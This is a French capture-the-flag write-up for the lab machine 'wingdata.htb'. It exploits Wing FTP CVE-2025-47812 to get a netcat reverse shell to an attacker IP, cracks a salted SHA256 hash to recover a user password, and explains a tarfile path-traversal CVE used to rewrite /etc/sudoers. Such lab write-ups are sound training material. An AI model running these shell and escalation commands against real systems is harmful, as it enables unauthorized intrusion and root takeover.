# User Flag
## Découverte
```shell
$ nmap
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Le site se présente sous la forme d'un service de partage de fichiers. On peut y remplir un formulaire à l'accueil avec nos coordonnées.
Il y a également un portail client qui nous redirige vers [ftp.wingdata.htb]() (URL à rajouter dans le `/etc/hosts`).
- Server FTP powered by **Wing FTP 7.4.3**
Pour se connecter, il faut des creds, que l'on ne possède pas.

## Recherche de faille sur Wing FTP
La version nous permet d'appliquer la *CVE-2025-47812*, qui nous permettra un Remote Code Execution avec ROOT privileges.
On trouve un PoC sur [Exploit DB](https://www.exploit-db.com/exploits/52347) par *4m3rr0r* sur GitHub.
```shell
$ python3 wingftp.py -u http://ftp.wingdata.htb/

[*] Testing target: http://ftp.wingdata.htb/
[+] http://ftp.wingdata.htb/ is vulnerable!
```
On va donc utiliser cet exploit pour créer un reverse shell avec `netcat` :
```shell
# Sur terminal 1
nc -lnvp 4444

# Sur terminal 2
python3 wingftp.py -u http://ftp.wingdata.htb/ -c "nc -e /bin/sh 10.10.14.197 4444" 
```
## Recherche d'informations et craquage de mot de passe
La connexion est établie, on est connecté en tant que `wingftp` et on récupère le contenu du dossier principal :
```
drwxr-x---  4 wingftp wingftp     4096 Apr 17 15:36 Data
-rwxr-x---  1 wingftp wingftp     4834 Jul 31  2018 License.txt
drwxr-x---  5 wingftp wingftp     4096 Apr 18 03:57 Log
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 lua
-rw-r--r--  1 wingftp wingftp        5 Apr 17 15:36 pid-wftpserver.pid
-rwxr-x---  1 wingftp wingftp     1434 Sep 13  2020 README
drwxr-x---  2 wingftp wingftp     4096 Apr 18 03:57 session
drwxr-x---  2 wingftp wingftp     4096 Feb  9 08:19 session_admin
-rwxr-x---  1 wingftp wingftp   115258 Mar 26  2025 version.txt
drwxr-x--- 10 wingftp wingftp    12288 Feb  9 08:19 webadmin
drwxr-x--- 13 wingftp wingftp     4096 Feb  9 08:19 webclient
-rwxr-x---  1 wingftp wingftp  4649509 Sep 14  2021 wftpconsole
-rwxr-x---  1 wingftp wingftp     3272 Nov  2 11:11 wftp_default_ssh.key
-rwxr-x---  1 wingftp wingftp     1342 Nov 22  2017 wftp_default_ssl.crt
-rwxr-x---  1 wingftp wingftp     1675 Nov 22  2017 wftp_default_ssl.key
-rwxr-x---  1 wingftp wingftp 22283682 Mar 26  2025 wftpserver

```
On a accès en lecture à `passwd`, il y a donc deux utilisateurs :
```
wingftp:x:1000:1000:WingFTP Daemon User,,,:/opt/wingftp:/bin/bash
wacky:x:1001:1001::/home/wacky:/bin/bash
```
On recherche dans l'ensemble des fichiers auxquels on a accès une mention de `wacky` :
```shell
grep -rnw '/opt' -e 'wacky'
```
On trouve un fichier avec la mention de wacky à `~/Data/1/users/wacky.htm`, et à l'intérieur on y trouve un hash : `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca`.
```shell
echo '32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP' > wacky_hash
john wacky_hash --wordlist=/usr/share/wordlists/rockyou.txt   # Pas de résultat
hashcat -m 1410 -a 0 wacky_hash /usr/share/wordlists/rockyou.txt -r /usr/share/wordlists/best64.rule
```
On voit dans la doc de Wing FTP Server que le système de hash utilisé par défaut est SHA256 Salé (ie qui rajoute un mot autour du mdp pour compliquer le hash, correspondant au code `1410`). On peut retrouver le SALT `<SaltingString>WingFTP</SaltingString>` dans le fichier de configuration `/opt/wftpserver/Data/1/settings.xml`, et on le place à la suite du hash dans le fichier.
On obtient alors le mot de passe pour *wacky* : `!#7Blushing^*Bride5`
On y trouve alors un fichier `user.txt`, qui contient le flag User.

# Root Flag
En faisant la commande `sudo -l`, on voit que l'on peut lancer un certain programme, `/opt/backup_clients/restore_backup_clients.py` avec les droits *root*. Analysons le programme.
## Faille dans l'application
On ne peut pas modifier le fichier avec *wacky*, mais l'on peut écrire dans `/opt/backup_clients/backups`, là où le programme va chercher les .tar à extraire. En cherchant "CVE TAR Python" sur Internet, on tombe assez rapidement sur la *CVE-2025-4517*, qui possède une [PoC par *AzureADTrent*](https://github.com/AzureADTrent/CVE-2025-4517-POC/blob/main/CVE-2025-4517-POC.py). Pour pourvoir l'utiliser, il faut une version de Python jusqu'à 3.13.1, et notre machine a une version en 3.12.3.

## Explication de la PoC
Avec cette faille, on peut écrire avec des droits root. En théorie, on peut donc modifier le fichier `/etc/sudoers`, pour y placer :
```
wacky ALL=(ALL) NOPASSWD: ALL
```
Ce qu'il se passe :
1. On créé une structure tar imbriquée, avec plein de fichiers (ici 16 niveaux de fichiers, chacun avec un nom de dossier très long)
2. On créé une chaîne de `../` qui remonte à la racine du système. La création du tar faisant que le filtre pense que l'on reste dans le tar.
3. On termine cette chaîne par `/etc`, puis on le nomme `escape` pour que le filtre ne détecte rien.
4. En modifiant `/espace/sudoers`, on modifiera réellement `/etc/sudoers`, en y inscrivant nos nouveaux droits root.